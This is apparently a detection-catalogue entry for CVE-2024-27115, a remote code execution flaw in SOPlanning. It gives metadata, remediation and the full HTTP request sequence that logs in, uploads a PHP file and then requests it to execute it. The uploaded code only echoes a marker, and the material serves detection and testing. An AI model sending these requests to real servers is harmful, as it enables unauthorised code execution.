---
layout: post
cve_id: CVE-2024-27115
title: SOPlanning - Remote Code Execution
pcap: true
pcap_path: /pcaps/2024/CVE-2024-27115.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-27115.yaml
snort2_rule: N/A
snort3_rule: N/A
author: soonghee2@ajou.ac.kr
severity: high
impact: 'Authenticated attackers can upload and execute arbitrary PHP files through
  the SOPlanning upload functionality, achieving remote code execution.

  '
remediation: 'Update SOPlanning to a version newer than 1.52.01.

  '
reference:
- https://www.exploit-db.com/exploits/52082
- https://nvd.nist.gov/vuln/detail/CVE-2024-27115
classification:
  cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/S:N/AU:Y/R:I/V:C/RE:M/U:Red
  cvss-score: 10.0
  cve-id: CVE-2024-27115
  cwe-id: CWE-434
  epss-score: 0.77121
  epss-percentile: 0.98923
  cpe: cpe:2.3:a:soplanning:soplanning:*:*:*:*:*:*:*:*
tags:
- cve
- cve2024
- soplanning
- rce
- authenticated
- file-upload
- intrusive
- vuln
---

## üîç Vulnerability Description
Detects a remote code execution vulnerability in SOPlanning version 1.52.01 through authenticated PHP file upload.


## üåê HTTP Request
```nohighlight
POST /process/login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/3.6.2
Connection: close
Content-Length: 30
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

login=KCxZUR&password=4tHXONYY
```

```nohighlight
POST /process/upload.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15
Connection: close
Content-Length: 627
Content-Type: multipart/form-data; boundary=0ccdfeede39eb97743b39d87536933e1
Accept-Encoding: gzip

--0ccdfeede39eb97743b39d87536933e1
Content-Disposition: form-data; name="linkid"

soonghee
--0ccdfeede39eb97743b39d87536933e1
Content-Disposition: form-data; name="periodeid"

0
--0ccdfeede39eb97743b39d87536933e1
Content-Disposition: form-data; name="fichiers"

38BKKS4wY1hFX6sXppfNRDyALTl.php
--0ccdfeede39eb97743b39d87536933e1
Content-Disposition: form-data; name="type"

upload
--0ccdfeede39eb97743b39d87536933e1
Content-Disposition: form-data; name="fichier-0"; filename="gObeQqIO.php"
Content-Type: application/x-php

<?php echo '38BKKS4wY1hFX6sXppfNRDyALTl'; ?>
--0ccdfeede39eb97743b39d87536933e1--
```

```nohighlight
GET /upload/files/soonghee/gObeQqIO.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

